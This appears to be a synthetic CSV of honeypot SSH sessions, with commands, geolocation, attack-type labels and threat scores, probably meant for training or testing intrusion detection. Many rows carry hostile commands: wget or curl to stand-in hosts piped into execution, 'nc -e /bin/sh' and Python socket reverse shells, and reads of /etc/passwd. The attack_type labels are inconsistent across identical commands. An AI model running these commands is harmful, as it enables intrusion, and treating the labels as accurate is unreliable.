session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10598,24.216.176.51,2025-10-04T05:55:16.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,2,1,0,,40.482508,116.527115,CN,benign,0.08
sess_10665,37.75.192.244,2025-10-04T05:56:57.746466Z,oracle,grep -R 'password' /var/log || true,0,1,0,,51.982967,13.981332,DE,benign,0.03
sess_10645,202.203.157.2,2025-10-04T05:58:08.746466Z,test,ls -la; id; uname -a,1,3,0,,52.266008,13.32214,DE,benign,0.115
sess_10534,54.139.108.150,2025-10-04T06:17:39.746466Z,ftp,ps aux | grep sshd,2,1,0,,49.321441,1.783355,FR,benign,0.08
sess_10517,81.225.209.66,2025-10-04T06:18:05.746466Z,postgres,whoami; pwd; ls -la,6,3,0,,38.02182,127.502367,KR,benign,0.24
sess_10535,185.62.201.96,2025-10-04T06:18:31.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,3,3,1,sha256:62e347d47246440d67ce7cc38ef1771df78ba3264c84d660d53961917e242bcf,53.066242,13.518045,DE,reverse_shell,0.665
sess_10532,53.161.251.196,2025-10-04T06:18:54.746466Z,ftp,ls -la; id; uname -a; cat /etc/passwd | grep root,0,4,0,,56.002955,37.541016,RU,recon,0.12
sess_10520,34.120.152.54,2025-10-04T06:18:59.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,1,4,0,,38.05923,-121.907603,US,benign,0.145
sess_10521,96.216.51.212,2025-10-04T06:18:59.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:0b0e20a6eab9aa863d2b7e6564f7f063fa516def03b0c2b1a9a642f5489c34de,51.299522,0.106452,GB,reverse_shell,0.615
sess_10530,154.21.91.67,2025-10-04T06:19:03.746466Z,ftp,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,0,2,0,,37.31511,-122.966405,US,benign,0.06
sess_10544,217.135.174.248,2025-10-04T06:19:12.746466Z,ubuntu,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,48.777159,1.773698,FR,payload_exec,0.09
sess_10546,33.64.69.4,2025-10-04T06:19:14.746466Z,admin,find / -maxdepth 2 -type f | head -n 20,2,1,0,,35.612446,139.842971,JP,benign,0.08
sess_10526,127.253.60.58,2025-10-04T06:19:21.746466Z,ubuntu,whoami; pwd; ls -la; ps aux | grep sshd,2,4,0,,36.283749,139.431261,JP,benign,0.17
sess_10537,165.195.47.103,2025-10-04T06:19:47.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,37.432703,126.860875,KR,malware_fetch,0.215
sess_10551,186.173.239.34,2025-10-04T06:20:07.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; python3 -c 'print(2+2)',3,2,0,,51.920838,0.018411,GB,benign,0.135
sess_10518,103.243.188.211,2025-10-04T06:20:14.746466Z,root,find / -maxdepth 2 -type f | head -n 20,2,1,0,,40.250763,116.095011,CN,benign,0.08
sess_10523,207.66.210.203,2025-10-04T06:20:20.746466Z,postgres,whoami; pwd; ls -la,3,3,0,,28.252296,77.106396,IN,benign,0.165
sess_10550,132.59.253.160,2025-10-04T06:20:34.746466Z,postgres,cat /etc/passwd | grep root,1,1,0,,37.784063,-122.31421,US,benign,0.055
sess_10529,96.120.241.233,2025-10-04T06:20:38.746466Z,user,ls -la; id; uname -a,6,3,0,,-23.344986,-47.074614,BR,benign,0.24
sess_10531,43.255.143.192,2025-10-04T06:20:41.746466Z,oracle,nc -e /bin/sh 10.10.10.5 4444,3,1,0,,51.527767,-0.20487,GB,payload_exec,0.105
sess_10519,152.196.158.164,2025-10-04T06:20:42.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20,0,1,0,,-22.976909,-46.92666,BR,benign,0.03
sess_10539,62.250.228.227,2025-10-04T06:20:55.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,0,2,0,,-23.708617,-47.009673,BR,reverse_shell,0.06
sess_10549,163.148.18.125,2025-10-04T06:21:01.746466Z,postgres,cat /etc/passwd | grep root; ls -la; id; uname -a; nc -lvp 4444 &,1,5,0,,-23.829081,-46.45534,BR,benign,0.175
sess_10527,184.96.214.47,2025-10-04T06:21:06.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,37.264482,127.077484,KR,reverse_shell,0.03
sess_10542,30.23.55.131,2025-10-04T06:21:14.746466Z,oracle,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,55.461632,37.115423,RU,payload_exec,0.115
sess_10525,190.86.25.103,2025-10-04T06:21:16.746466Z,user,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:e8021ef16a6aa6c28cc75f5b86a74b3a3cd79738636bd9629732c9d041960626,52.551005,13.733031,DE,reverse_shell,0.59
sess_10522,206.26.94.162,2025-10-04T06:21:24.746466Z,unknown,ps aux | grep sshd,0,1,0,,55.345187,37.636939,RU,benign,0.03
sess_10536,12.168.22.168,2025-10-04T06:21:28.746466Z,pi,cat /etc/passwd | grep root; nc -lvp 4444 &,0,2,0,,35.156142,139.176569,JP,benign,0.06
sess_10543,139.8.58.190,2025-10-04T06:21:33.746466Z,test,ls -la; id; uname -a; ps aux | grep sshd,2,4,0,,28.922725,77.148937,IN,benign,0.17
sess_10547,213.97.44.78,2025-10-04T06:21:34.746466Z,test,ls -la; id; uname -a,1,3,0,,37.548556,126.401553,KR,benign,0.115
sess_10528,176.234.43.3,2025-10-04T06:21:37.746466Z,test,python3 -c 'print(2+2)'; python3 -c 'print(2+2)',0,2,0,,39.418535,115.877903,CN,benign,0.06
sess_10541,130.223.40.233,2025-10-04T06:21:41.746466Z,guest,curl -s http://evil.tld/payload.sh | sh,4,1,1,sha256:8de60a1ec9d0cbffdd4bd44fc1d74b6aeca1a48db062d686bbe0b4bf4367e36f,51.261978,-0.670526,GB,payload_exec,0.63
sess_10545,112.59.6.44,2025-10-04T06:21:41.746466Z,postgres,whoami; pwd; ls -la; find / -maxdepth 2 -type f | head -n 20,6,4,0,,52.730123,13.770569,DE,benign,0.27
sess_10538,176.78.61.77,2025-10-04T06:21:48.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,39.419534,116.248348,CN,payload_exec,0.08
sess_10540,172.218.47.11,2025-10-04T06:21:59.746466Z,pi,python3 -c 'print(2+2)',1,1,0,,37.95157,-122.918636,US,benign,0.055
sess_10533,137.20.226.92,2025-10-04T06:22:24.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20,0,1,0,,29.055708,76.825786,IN,recon,0.03
sess_10548,126.124.103.76,2025-10-04T06:22:28.746466Z,oracle,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:92ba3a264105880ccf3adfefa7fcb9b00e438f110311a6cade861efb09e4d07c,40.32254,116.691894,CN,malware_fetch,0.64
sess_10515,112.71.120.29,2025-10-04T06:22:29.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,5,2,0,,52.22217,13.866478,DE,benign,0.185
sess_10524,57.201.193.242,2025-10-04T06:22:29.746466Z,ubuntu,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:b365b3e7e81fe4eb54123810bdb4502ea7141647f869371b88e1e4e5bda155e4,49.425553,1.990119,FR,payload_exec,0.64
sess_10516,71.62.160.85,2025-10-04T06:22:36.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,35.262633,139.301885,JP,payload_exec,0.09
sess_10332,60.232.206.148,2025-10-04T06:28:39.746466Z,guest,chmod +x /tmp/h; /tmp/h &,1,2,0,,55.563759,37.157711,RU,malware_fetch,0.085
sess_10339,41.235.161.177,2025-10-04T06:28:41.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,1,5,0,,-23.865933,-46.667686,BR,benign,0.175
sess_10426,43.68.5.19,2025-10-04T06:28:45.746466Z,test,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,3,2,0,,36.121683,140.163999,JP,recon,0.135
sess_10354,170.251.96.83,2025-10-04T06:28:46.746466Z,test,chmod +x /tmp/h; /tmp/h &,5,2,0,,48.579634,2.610435,FR,malware_fetch,0.185
sess_10514,56.21.248.201,2025-10-04T06:28:47.746466Z,root,whoami; pwd; ls -la,5,3,0,,49.332728,2.558206,FR,recon,0.215
sess_10439,83.128.98.9,2025-10-04T06:28:49.746466Z,user,chmod +x /tmp/h; /tmp/h &,9,2,0,,-23.431238,-47.087152,BR,payload_exec,0.285
sess_10477,21.71.59.79,2025-10-04T06:28:49.746466Z,oracle,ps aux | grep sshd,2,1,0,,37.666618,126.644573,KR,recon,0.08
sess_10500,36.27.34.128,2025-10-04T06:28:50.746466Z,test,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,37.2905,-122.927579,US,reverse_shell,0.09
sess_10504,101.145.164.16,2025-10-04T06:28:51.746466Z,user,nc -e /bin/sh 10.10.10.5 4444,3,1,0,,49.174833,2.502384,FR,reverse_shell,0.105
sess_10357,74.197.226.64,2025-10-04T06:28:54.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x,2,2,0,,37.341031,126.765676,KR,benign,0.11
sess_10330,143.118.86.173,2025-10-04T06:28:55.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:b0c3afcb866b0e8a70e6721a81a3394438e002a3d8edffbfe91f7515b423e2ea,37.978494,-122.532859,US,malware_fetch,0.59
sess_10407,183.245.242.205,2025-10-04T06:28:55.746466Z,www-data,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:71173648f38ddda8889334c2fa8d1159017198077830a3be4a8c320fa075f817,37.521464,127.355,KR,payload_exec,0.555
sess_10412,36.67.105.186,2025-10-04T06:28:55.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,0,2,0,,55.980263,37.730445,RU,malware_fetch,0.06
sess_10372,16.141.79.25,2025-10-04T06:28:56.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:cced4a952cf272488694115199c621843c063e598ae170ad32690b208df96f1d,56.129089,37.127586,RU,reverse_shell,0.53
sess_10428,79.210.187.9,2025-10-04T06:28:56.746466Z,user,ls -la; id; uname -a; ps aux | grep sshd,2,4,0,,40.484495,116.987802,CN,recon,0.17
sess_10413,33.170.239.228,2025-10-04T06:29:00.746466Z,admin,ls -la; id; uname -a; find / -maxdepth 2 -type f | head -n 20,0,4,0,,28.357781,77.247731,IN,benign,0.12
sess_10473,134.190.147.198,2025-10-04T06:29:01.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",7,3,0,,28.65628,76.827737,IN,malware_fetch,0.265
sess_10374,158.195.40.200,2025-10-04T06:29:05.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",10,3,0,,49.181068,2.649414,FR,reverse_shell,0.34
sess_10466,186.41.171.189,2025-10-04T06:29:05.746466Z,ftp,grep -R 'password' /var/log || true; ls -la; id; uname -a,0,4,0,,35.299821,139.762249,JP,benign,0.12
sess_10364,209.122.164.185,2025-10-04T06:29:09.746466Z,www-data,cat /etc/passwd | grep root; python3 -c 'print(2+2)',0,2,0,,48.748365,2.138629,FR,benign,0.06
sess_10468,79.216.141.14,2025-10-04T06:29:09.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,40.15599,116.62137,CN,payload_exec,0.24
sess_10484,206.141.252.249,2025-10-04T06:29:11.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,2,3,0,,48.4001,2.367231,FR,benign,0.14
sess_10415,191.145.125.44,2025-10-04T06:29:13.746466Z,guest,echo 'hello' > /tmp/x; cat /tmp/x; ls -la; id; uname -a; nc -lvp 4444 &,0,6,0,,52.38032,12.908343,DE,benign,0.18
sess_10449,128.76.119.237,2025-10-04T06:29:13.746466Z,root,python3 -c 'print(2+2)'; ps aux | grep sshd,2,2,0,,-23.993855,-47.026601,BR,recon,0.11
sess_10465,171.237.0.221,2025-10-04T06:29:13.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,2,5,0,,52.610275,13.053576,DE,benign,0.2
sess_10429,210.143.238.133,2025-10-04T06:29:17.746466Z,ftp,cat /etc/passwd | grep root,2,1,0,,-23.329611,-46.586263,BR,benign,0.08
sess_10490,89.64.107.34,2025-10-04T06:29:17.746466Z,oracle,ls -la; id; uname -a,0,3,0,,37.304281,-122.067734,US,benign,0.09
sess_10432,170.13.146.125,2025-10-04T06:29:19.746466Z,test,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,2,5,0,,55.880386,38.109458,RU,benign,0.2
sess_10478,207.142.100.6,2025-10-04T06:29:19.746466Z,ftp,grep -R 'password' /var/log || true,2,1,0,,39.918067,115.874657,CN,benign,0.08
sess_10377,201.25.204.68,2025-10-04T06:29:20.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20,0,1,0,,37.652097,127.051401,KR,benign,0.03
sess_10454,163.92.255.157,2025-10-04T06:29:22.746466Z,www-data,whoami; pwd; ls -la; ls -la; id; uname -a,1,6,0,,48.371421,2.186482,FR,recon,0.205
sess_10331,62.7.35.236,2025-10-04T06:29:23.746466Z,ftp,chmod +x /tmp/h; /tmp/h &,0,2,0,,51.239209,-0.000164,GB,payload_exec,0.06
sess_10492,62.94.179.8,2025-10-04T06:29:23.746466Z,test,grep -R 'password' /var/log || true; whoami; pwd; ls -la,2,4,0,,55.445987,37.701582,RU,benign,0.17
sess_10343,219.130.243.215,2025-10-04T06:29:26.746466Z,postgres,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,0,5,0,,28.159385,77.649842,IN,benign,0.15
sess_10419,141.52.207.210,2025-10-04T06:29:31.746466Z,pi,find / -maxdepth 2 -type f | head -n 20,1,1,0,,-23.40545,-46.575761,BR,benign,0.055
sess_10503,90.199.249.196,2025-10-04T06:29:33.746466Z,user,ps aux | grep sshd; find / -maxdepth 2 -type f | head -n 20,1,2,0,,29.178945,77.349328,IN,benign,0.085
sess_10470,30.55.84.71,2025-10-04T06:29:34.746466Z,unknown,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:bfe1d9c98c30abc075dc8bc69eb5cc84826290ec6cf266d4a2fde191ecea54d0,38.33839,-122.369678,US,malware_fetch,0.555
sess_10457,212.14.248.132,2025-10-04T06:29:36.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,0,5,0,,37.90127,126.769359,KR,benign,0.15
sess_10474,55.78.82.61,2025-10-04T06:29:36.746466Z,root,ps aux | grep sshd,2,1,0,,49.055264,2.925827,FR,benign,0.08
sess_10396,75.165.83.184,2025-10-04T06:29:40.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,35.550405,140.04098,JP,payload_exec,0.09
sess_10365,35.34.22.214,2025-10-04T06:29:43.746466Z,test,ls -la; id; uname -a,2,3,0,,52.386319,13.392892,DE,recon,0.14
sess_10342,13.90.215.128,2025-10-04T06:29:45.746466Z,www-data,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,0,4,0,,55.984452,37.089344,RU,benign,0.12
sess_10328,110.2.46.211,2025-10-04T06:29:51.746466Z,postgres,ls -la; id; uname -a; whoami; pwd; ls -la,2,6,0,,40.421022,116.288174,CN,benign,0.23
sess_10388,41.94.162.215,2025-10-04T06:29:51.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,40.198932,116.793438,CN,reverse_shell,0.18
sess_10436,191.199.242.68,2025-10-04T06:29:51.746466Z,ftp,whoami; pwd; ls -la,0,3,0,,35.725804,140.238745,JP,benign,0.09
sess_10380,32.57.27.63,2025-10-04T06:29:52.746466Z,guest,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,37.573152,-122.131384,US,malware_fetch,0.09
sess_10400,222.106.25.48,2025-10-04T06:29:52.746466Z,root,cat /etc/passwd | grep root; nc -lvp 4444 &,2,2,0,,37.572233,-122.914157,US,benign,0.11
sess_10414,208.225.60.70,2025-10-04T06:29:53.746466Z,test,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,6,3,1,sha256:6c9919a61088a405724fc59143b38a3b66c7e3a5c562d1062aaaab4ca8f879ee,48.915839,2.077463,FR,payload_exec,0.74
sess_10462,94.222.113.229,2025-10-04T06:29:53.746466Z,user,grep -R 'password' /var/log || true; ls -la; id; uname -a,0,4,0,,55.793146,37.592423,RU,benign,0.12
sess_10355,197.4.119.24,2025-10-04T06:29:54.746466Z,root,ps aux | grep sshd; find / -maxdepth 2 -type f | head -n 20,2,2,0,,51.958085,12.901268,DE,benign,0.11
sess_10327,179.60.117.115,2025-10-04T06:29:59.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",3,3,0,,37.787977,126.440463,KR,reverse_shell,0.165
sess_10441,81.218.165.66,2025-10-04T06:29:59.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:f64ec1d22fc19aaa94d1fc2ebc7666061b3ced16bcd16d70f695d1bf8a3c5e19,51.882761,-0.514285,GB,reverse_shell,0.59
sess_10475,48.190.229.139,2025-10-04T06:30:00.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:2ba4c3a9aaf2fd542dc5599f583f0195e781ab102cf283cedde8855fdd3d6ad4,53.033374,12.992264,DE,reverse_shell,0.715
sess_10480,124.212.226.74,2025-10-04T06:30:00.746466Z,unknown,python3 -c 'print(2+2)'; ps aux | grep sshd,0,2,0,,37.538777,-121.833341,US,benign,0.06
sess_10435,24.135.59.14,2025-10-04T06:30:02.746466Z,postgres,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,52.559025,13.260761,DE,reverse_shell,0.08
sess_10506,27.156.58.87,2025-10-04T06:30:03.746466Z,root,ps aux | grep sshd,4,1,0,,35.409443,139.92685,JP,benign,0.13
sess_10450,23.157.49.117,2025-10-04T06:30:04.746466Z,user,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:0e230d42034d134f990064e43cb5f0e176cd5a8493abd75af2075ed3cd0b570b,38.140244,-122.507946,US,malware_fetch,0.615
sess_10460,39.238.234.108,2025-10-04T06:30:04.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,38.318212,-121.932706,US,payload_exec,0.03
sess_10329,178.146.29.243,2025-10-04T06:30:06.746466Z,www-data,cat /etc/passwd | grep root,0,1,0,,-24.110169,-46.513882,BR,benign,0.03
sess_10433,200.77.228.95,2025-10-04T06:30:06.746466Z,guest,ps aux | grep sshd,0,1,0,,28.115182,76.783084,IN,benign,0.03
sess_10335,202.175.38.142,2025-10-04T06:30:08.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:d205652e96a9fcf8cb3c533bb7538ef1db36625ea1eb3d729f8fcae30a30c781,53.011913,13.403799,DE,payload_exec,0.53
sess_10398,90.228.147.161,2025-10-04T06:30:09.746466Z,admin,ls -la; id; uname -a,1,3,0,,39.902571,116.776345,CN,recon,0.115
sess_10404,138.254.252.207,2025-10-04T06:30:09.746466Z,user,nc -e /bin/sh 10.10.10.5 4444,5,1,0,,49.007153,1.893711,FR,malware_fetch,0.155
sess_10438,161.99.172.174,2025-10-04T06:30:09.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; nc -lvp 4444 &,0,2,0,,39.839331,116.0707,CN,recon,0.06
sess_10494,192.243.187.179,2025-10-04T06:30:11.746466Z,postgres,cat /etc/passwd | grep root,0,1,0,,48.529665,1.887615,FR,benign,0.03
sess_10389,174.140.77.200,2025-10-04T06:30:13.746466Z,admin,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:683c441bdf72be2c1b89658ee0648b90957a14e0d9e3ee8aae5bc9eb6e6da84f,-23.434867,-46.956205,BR,payload_exec,0.64
sess_10493,36.7.111.184,2025-10-04T06:30:15.746466Z,guest,chmod +x /tmp/h; /tmp/h &,11,2,0,,28.270718,77.214034,IN,malware_fetch,0.335
sess_10459,110.191.69.118,2025-10-04T06:30:16.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,5,1,0,,-23.468101,-46.896575,BR,malware_fetch,0.155
sess_10458,36.121.211.223,2025-10-04T06:30:19.746466Z,oracle,ps aux | grep sshd,0,1,0,,40.417665,116.353389,CN,benign,0.03
sess_10498,27.186.101.87,2025-10-04T06:30:19.746466Z,user,ls -la; id; uname -a; find / -maxdepth 2 -type f | head -n 20,2,4,0,,40.002502,116.134967,CN,benign,0.17
sess_10420,134.196.33.88,2025-10-04T06:30:23.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,2,5,0,,38.06214,-122.165109,US,benign,0.2
sess_10455,205.112.237.198,2025-10-04T06:30:23.746466Z,guest,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:17137326e5544402f4f4410cb8d5e860b2f4a5acee067e7fabb71f0309b87121,52.131589,13.609171,DE,malware_fetch,0.64
sess_10456,22.27.186.73,2025-10-04T06:30:24.746466Z,oracle,chmod +x /tmp/h; /tmp/h &,0,2,0,,36.199334,139.302765,JP,reverse_shell,0.06
sess_10422,94.253.31.24,2025-10-04T06:30:28.746466Z,test,find / -maxdepth 2 -type f | head -n 20,0,1,0,,55.894487,37.553892,RU,benign,0.03
sess_10334,40.132.34.98,2025-10-04T06:30:29.746466Z,www-data,ps aux | grep sshd; whoami; pwd; ls -la,0,4,0,,48.601347,2.230917,FR,benign,0.12
sess_10366,170.131.25.94,2025-10-04T06:30:30.746466Z,user,grep -R 'password' /var/log || true,4,1,0,,35.185448,140.052924,JP,benign,0.13
sess_10488,37.111.79.129,2025-10-04T06:30:30.746466Z,ubuntu,ps aux | grep sshd,0,1,0,,39.325055,116.225252,CN,recon,0.03
sess_10386,197.195.116.107,2025-10-04T06:30:40.746466Z,user,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,35.337609,139.257992,JP,payload_exec,0.03
sess_10463,215.50.231.127,2025-10-04T06:30:40.746466Z,admin,python3 -c 'print(2+2)',0,1,0,,28.300775,77.807742,IN,benign,0.03
sess_10452,189.189.84.113,2025-10-04T06:30:41.746466Z,user,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:dc8266c22ad6fe53632a01ca377b799ed0a79e4a5e03a3ff8f1000aa1d65d644,55.740161,37.024919,RU,payload_exec,0.64
sess_10491,142.30.240.31,2025-10-04T06:30:46.746466Z,root,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,3,3,0,,52.011518,-0.481319,GB,malware_fetch,0.165
sess_10385,71.141.31.161,2025-10-04T06:30:48.746466Z,oracle,grep -R 'password' /var/log || true,0,1,0,,52.391416,12.969713,DE,benign,0.03
sess_10336,62.120.123.224,2025-10-04T06:30:52.746466Z,ubuntu,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:40cfa2a65e99ff2c6c9e67e97ac69d2618d03720b4a30356688498ece8b74845,35.183685,140.238636,JP,payload_exec,0.53
sess_10378,199.126.124.19,2025-10-04T06:30:53.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,39.812449,116.225369,CN,payload_exec,0.09
sess_10341,158.117.51.185,2025-10-04T06:30:55.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,51.79365,-0.160216,GB,reverse_shell,0.09
sess_10382,26.145.102.203,2025-10-04T06:30:55.746466Z,root,ls -la; id; uname -a,5,3,0,,55.588063,37.14677,RU,benign,0.215
sess_10437,35.181.221.157,2025-10-04T06:30:56.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:6f96c858e869dd324bce36cc3cf16d46d007d476f1f23606be1a9c2354581852,37.865409,127.259176,KR,reverse_shell,0.64
sess_10359,94.7.85.204,2025-10-04T06:30:58.746466Z,user,curl -s http://evil.tld/payload.sh | sh,6,1,1,sha256:0275180db09451f57552102d817567a2ab7f00e08bca08c7c026026b1026efba,-23.324412,-47.04731,BR,malware_fetch,0.68
sess_10344,166.101.89.251,2025-10-04T06:31:02.746466Z,pi,chmod +x /tmp/h; /tmp/h &,3,2,0,,48.350689,2.488597,FR,reverse_shell,0.135
sess_10401,38.213.91.42,2025-10-04T06:31:02.746466Z,user,grep -R 'password' /var/log || true,0,1,0,,51.829614,-0.340414,GB,benign,0.03
sess_10446,98.41.235.195,2025-10-04T06:31:05.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,6,2,0,,35.448144,139.559826,JP,malware_fetch,0.21
sess_10476,200.169.151.122,2025-10-04T06:31:05.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20,0,1,0,,35.224279,139.666477,JP,benign,0.03
sess_10501,203.252.238.52,2025-10-04T06:31:07.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,3,3,0,,52.096254,0.328351,GB,recon,0.165
sess_10483,213.1.78.68,2025-10-04T06:31:10.746466Z,www-data,ls -la; id; uname -a; python3 -c 'print(2+2)',4,4,0,,28.787643,76.643131,IN,benign,0.22
sess_10423,63.162.153.146,2025-10-04T06:31:12.746466Z,oracle,grep -R 'password' /var/log || true; echo 'hello' > /tmp/x; cat /tmp/x,3,3,0,,29.036906,76.683893,IN,benign,0.165
sess_10375,165.5.195.14,2025-10-04T06:31:13.746466Z,ftp,chmod +x /tmp/h; /tmp/h &,0,2,0,,52.184957,12.865624,DE,payload_exec,0.06
sess_10379,93.176.12.198,2025-10-04T06:31:13.746466Z,test,echo 'hello' > /tmp/x; cat /tmp/x; ps aux | grep sshd,2,3,0,,-23.963311,-46.359116,BR,benign,0.14
sess_10408,201.28.153.145,2025-10-04T06:31:18.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x,3,2,0,,39.383656,115.986566,CN,benign,0.135
sess_10512,206.153.222.106,2025-10-04T06:31:20.746466Z,admin,whoami; pwd; ls -la; whoami; pwd; ls -la,0,6,0,,55.44198,37.197255,RU,benign,0.18
sess_10373,113.111.39.186,2025-10-04T06:31:23.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; python3 -c 'print(2+2)',1,2,0,,28.374372,77.485947,IN,benign,0.085
sess_10444,181.199.136.39,2025-10-04T06:31:25.746466Z,oracle,ps aux | grep sshd; ps aux | grep sshd,0,2,0,,48.527616,2.213509,FR,benign,0.06
sess_10405,64.212.211.12,2025-10-04T06:31:27.746466Z,pi,ls -la; id; uname -a,3,3,0,,52.289327,13.413028,DE,benign,0.165
sess_10406,93.3.58.176,2025-10-04T06:31:27.746466Z,pi,chmod +x /tmp/h; /tmp/h &,6,2,0,,35.322319,140.09229,JP,payload_exec,0.21
sess_10467,28.104.70.252,2025-10-04T06:31:28.746466Z,ubuntu,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,3,2,0,,37.879563,126.762557,KR,benign,0.135
